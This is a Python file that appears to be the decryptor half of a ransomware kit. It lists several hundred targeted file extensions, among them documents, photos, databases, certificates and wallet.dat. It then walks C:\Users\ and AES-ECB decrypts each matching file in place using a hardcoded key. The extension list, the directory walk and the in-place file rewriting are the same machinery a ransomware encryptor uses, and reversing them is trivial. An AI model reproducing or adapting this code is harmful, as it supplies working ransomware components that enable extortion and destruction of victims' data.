from Crypto.Cipher import AES 
from Crypto.Util.Padding import pad, unpad
import os

fileTypes = ['.txt','.exe','.php','.pl','.7z','.rar','.m4a','.wma','.avi','.wmv','.csv','.d3dbsp','.sc2save','.sie','.sum','.ibank','.t13','.t12','.qdf','.gdb','.tax','.pkpass','.bc6','.bc7','.bkp','.qic','.bkf','.sidn','.sidd','.mddata','.itl','.itdb','.icxs','.hvpl','.hplg','.hkdb','.mdbackup','.syncdb','.gho','.cas','.svg','.map','.wmo','.itm','.sb','.fos','.mcgame','.vdf','.ztmp','.sis','.sid','.ncf','.menu','.layout','.dmp','.blob','.esm','.001','.vtf','.dazip','.fpk','.mlx','.kf','.iwd','.vpk','.tor','.psk','.rim','.w3x','.fsh','.ntl','.arch00','.lvl','.snx','.cfr','.ff','.vpp_pc','.lrf','.m2','.mcmeta','.vfs0','.mpqge','.kdb','.db0','.mp3','.upx','.rofl','.hkx','.bar','.upk','.das','.iwi','.litemod','.asset','.forge','.ltx','.bsa','.apk','.re4','.sav','.lbf','.slm','.bik','.epk','.rgss3a','.pak','.big','.unity3d','.wotreplay','.xxx','.desc','.py','.m3u','.flv','.js','.css','.rb','.png','.jpeg','.p7c','.p7b','.p12','.pfx','.pem','.crt','.cer','.der','.x3f','.srw','.pef','.ptx','.r3d','.rw2','.rwl','.raw','.raf','.orf','.nrw','.mrwref','.mef','.erf','.kdc','.dcr','.cr2','.crw','.bay','.sr2','.srf','.arw','.3fr','.dng','.jpeg','.jpg','.cdr','.indd','.ai','.eps','.pdf','.pdd','.psd','.dbfv','.mdf','.wb2','.rtf','.wpd','.dxg','.xf','.dwg','.pst','.accdb','.mdb','.pptm','.pptx','.ppt','.xlk','.xlsb','.xlsm','.xlsx','.xls','.wps','.docm','.docx','.doc','.odb','.odc','.odm','.odp','.ods','.odt','.sql','.zip','.tar','.tar.gz','.tgz','.biz','.ocx','.html','.htm','.3gp','.srt','.cpp','.mid','.mkv','.mov','.asf','.mpeg','.vob','.mpg','.fla','.swf','.wav','.qcow2','.vdi','.vmdk','.vmx','.gpg','.aes','.ARC','.PAQ','.tar.bz2','.tbk','.bak','.djv','.djvu','.bmp','.cgm','.tif','.tiff','.NEF','.cmd','.class','.jar','.java','.asp','.brd','.sch','.dch','.dip','.vbs','.asm','.pas','.ldf','.ibd','.MYI','.MYD','.frm','.dbf','.SQLITEDB','.SQLITE3','.asc','.lay6','.lay','.ms11(Securitycopy)','.sldm','.sldx','.ppsm','.ppsx','.ppam','.docb','.mml','.sxm','.otg','.slk','.xlw','.xlt','.xlm','.xlc','.dif','.stc','.sxc','.ots','.ods','.hwp','.dotm','.dotx','.docm','.DOT','.max','.xml','.uot','.stw','.sxw','.ott','.csr','.key','wallet.dat']

class decrypter:
	def __init__(self, key, filepath):
		self.key = key
		self.filePath = filepath
		self.crypto = AES.new(self.key.encode(), AES.MODE_ECB)
		self.run()

	def decryptFile(self, file):
		with open(file, 'rb') as infile:
			content = self.crypto.decrypt((infile.read()))
			with open(file, "wb") as outfile:
				outfile.write(content)
				outfile.close()
	def run(self):
		for root, directories, files in os.walk(self.filePath):
			for filename in files:
				filepath = os.path.join(root, filename)
				for base in fileTypes:
					if base in filepath:
						try:
							self.decryptFile(filepath)
							print(f"[+] - Decrypting File: {filename}")
						
						except:
							pass

decrypter("YOHrdYmaYWgzmsQJsUHWLaIjytRMjlZN", "C:\\Users\\")